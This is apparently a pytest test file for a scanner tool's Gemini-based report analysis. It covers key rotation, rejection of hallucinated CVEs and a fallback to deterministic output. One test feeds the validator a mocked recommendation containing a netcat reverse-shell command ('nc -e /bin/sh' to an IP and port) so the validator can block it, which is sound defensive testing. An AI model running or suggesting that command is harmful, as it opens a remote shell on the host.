"""
Week 4 tests — Live AI Integration (Google Gemini REST Provider & Fallback).

All tests are fast and offline: external HTTP calls to Gemini are mocked
using unittest.mock.
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock, patch

import pytest

from app.ai.provider import GeminiProvider, get_ai_provider
from app.api.reports import _get_analysis
from app.core.errors import LLMError, LLMValidationError

# ── Sample Fixtures ───────────────────────────────────────────────────────────


@pytest.fixture
def sample_findings():
    return [
        {
            "cve_id": "CVE-2011-3192",
            "title": "Apache Range Header DoS",
            "severity": "HIGH",
            "cvss_score": 7.8,
            "confidence": "high",
            "evidence_type": "external_intelligence",
            "service_name": "http",
            "port": 80,
            "product": "Apache httpd",
            "version": "2.2.8",
            "is_kev": False,
            "priority_score": 68.0,
        }
    ]


@pytest.fixture
def sample_scan_context():
    return {
        "target": "192.168.56.101",
        "profile": "quick",
        "scan_time": "2026-10-27T12:00:00Z",
        "service_count": 1,
    }


def make_gemini_response(text: str, status_code: int = 200) -> MagicMock:
    """Helper to build a mocked httpx.Response for Gemini API."""
    mock_resp = MagicMock()
    mock_resp.status_code = status_code
    mock_resp.text = json.dumps({"candidates": [{"content": {"parts": [{"text": text}]}}]})
    mock_resp.json.return_value = {"candidates": [{"content": {"parts": [{"text": text}]}}]}
    return mock_resp


# ── Gemini Provider Unit Tests ────────────────────────────────────────────────


class TestGeminiProvider:
    """Unit tests for GeminiProvider with mocked HTTP."""

    def test_availability_true_with_keys(self):
        provider = GeminiProvider(api_keys=["key1", "key2"])
        assert provider.is_available() is True

    def test_availability_false_without_keys(self):
        provider = GeminiProvider(api_keys=[])
        assert provider.is_available() is False

    @patch("httpx.Client.post")
    def test_successful_analysis(self, mock_post, sample_findings, sample_scan_context):
        """Valid JSON from Gemini passes validation and returns structured dict."""
        ai_output = json.dumps(
            {
                "summary": "Scan found 1 service with Apache Range header vulnerability.",
                "risk_overview": "High priority DoS risk on port 80 (CVE-2011-3192).",
                "critical_findings": ["CVE-2011-3192: Denial of Service condition."],
                "recommendations": ["Upgrade Apache to 2.2.20 or newer."],
                "confidence_notes": "High confidence match based on version 2.2.8.",
                "limitations": "Tested only network responsiveness.",
            }
        )
        mock_post.return_value = make_gemini_response(ai_output, status_code=200)

        provider = GeminiProvider(api_keys=["test-key-1"], model="gemini-1.5-flash")
        result = provider.analyze_findings(sample_findings, sample_scan_context)

        assert "summary" in result
        assert "risk_overview" in result
        assert result["analysis_method"] == "ai (gemini-1.5-flash)"
        assert len(result["recommendations"]) == 1

        # Check that proper header was passed
        mock_post.assert_called_once()
        _, kwargs = mock_post.call_args
        assert kwargs["headers"]["x-goog-api-key"] == "test-key-1"

    @patch("httpx.Client.post")
    def test_key_rotation_on_429(self, mock_post, sample_findings, sample_scan_context):
        """When Key 1 hits 429 (rate limit), provider rotates to Key 2 and succeeds."""
        resp_429 = MagicMock()
        resp_429.status_code = 429
        resp_429.text = "Rate limit exceeded"

        ai_output = json.dumps(
            {
                "summary": "Summary via Key 2.",
                "risk_overview": "Overview via Key 2.",
                "recommendations": ["Patch system."],
                "limitations": "Scope limits.",
            }
        )
        resp_200 = make_gemini_response(ai_output, status_code=200)

        # First call gets 429, second call gets 200
        mock_post.side_effect = [resp_429, resp_200]

        provider = GeminiProvider(api_keys=["key-exhausted", "key-fresh"])
        result = provider.analyze_findings(sample_findings, sample_scan_context)

        assert mock_post.call_count == 2
        assert result["summary"] == "Summary via Key 2."

    @patch("httpx.Client.post")
    def test_catches_hallucinated_cve(self, mock_post, sample_findings, sample_scan_context):
        """If Gemini hallucinates a CVE not in input findings, LLMValidationError is raised."""
        ai_output = json.dumps(
            {
                "summary": "Found fabricated bug.",
                "risk_overview": "Target is vulnerable to CVE-2099-99999.",  # NOT in findings
                "recommendations": ["Fix immediately."],
                "limitations": "None.",
            }
        )
        mock_post.return_value = make_gemini_response(ai_output, status_code=200)

        provider = GeminiProvider(api_keys=["test-key"])
        with pytest.raises(LLMValidationError) as exc_info:
            provider.analyze_findings(sample_findings, sample_scan_context)
        assert "CVE-2099-99999" in str(exc_info.value)

    @patch("httpx.Client.post")
    def test_catches_dangerous_command(self, mock_post, sample_findings, sample_scan_context):
        """If output includes forbidden commands, LLMValidationError is raised."""
        ai_output = json.dumps(
            {
                "summary": "Summary.",
                "risk_overview": "Overview.",
                "recommendations": ["Run: nc -e /bin/sh 10.0.0.1 4444 to test access."],
                "limitations": "None.",
            }
        )
        mock_post.return_value = make_gemini_response(ai_output, status_code=200)

        provider = GeminiProvider(api_keys=["test-key"])
        with pytest.raises(LLMValidationError):
            provider.analyze_findings(sample_findings, sample_scan_context)


# ── Factory & Settings Tests ──────────────────────────────────────────────────


class TestGeminiFactory:
    """Tests for get_ai_provider() with configuration settings."""

    def test_provider_none_when_disabled(self, monkeypatch):
        monkeypatch.setenv("AI_ENABLED", "false")
        from app.config import reset_settings

        reset_settings()
        provider = get_ai_provider()
        assert provider is None
        reset_settings()

    def test_provider_creates_gemini_with_multiple_keys(self, monkeypatch):
        monkeypatch.setenv("AI_ENABLED", "true")
        monkeypatch.setenv("AI_PROVIDER", "gemini")
        monkeypatch.setenv("GEMINI_API_KEY", "keyA, keyB, keyC")
        monkeypatch.setenv("GEMINI_MODEL", "gemini-1.5-flash")
        from app.config import reset_settings

        reset_settings()

        provider = get_ai_provider()
        assert isinstance(provider, GeminiProvider)
        assert provider.api_keys == ["keyA", "keyB", "keyC"]
        assert provider.model == "gemini-1.5-flash"
        reset_settings()


# ── Transparent Fallback Tests ────────────────────────────────────────────────


class TestAnalysisFallback:
    """Tests for _get_analysis() fallback behavior."""

    def test_falls_back_to_deterministic_when_gemini_fails(
        self, monkeypatch, sample_findings, sample_scan_context
    ):
        """When Gemini throws an error, _get_analysis returns deterministic output without crashing."""
        monkeypatch.setenv("AI_ENABLED", "true")
        monkeypatch.setenv("AI_PROVIDER", "gemini")
        monkeypatch.setenv("GEMINI_API_KEY", "test-key")
        from app.config import reset_settings

        reset_settings()

        # Mock the provider to raise LLMError
        with patch.object(GeminiProvider, "analyze_findings", side_effect=LLMError("API failure")):
            scan = {"target": "192.168.56.101", "profile": "quick"}
            services = [{"product": "Apache", "version": "2.2.8"}]
            result = _get_analysis(scan, services, sample_findings)

        # Must fall back gracefully to deterministic analysis
        assert result["analysis_method"] == "deterministic"
        assert "summary" in result
        reset_settings()
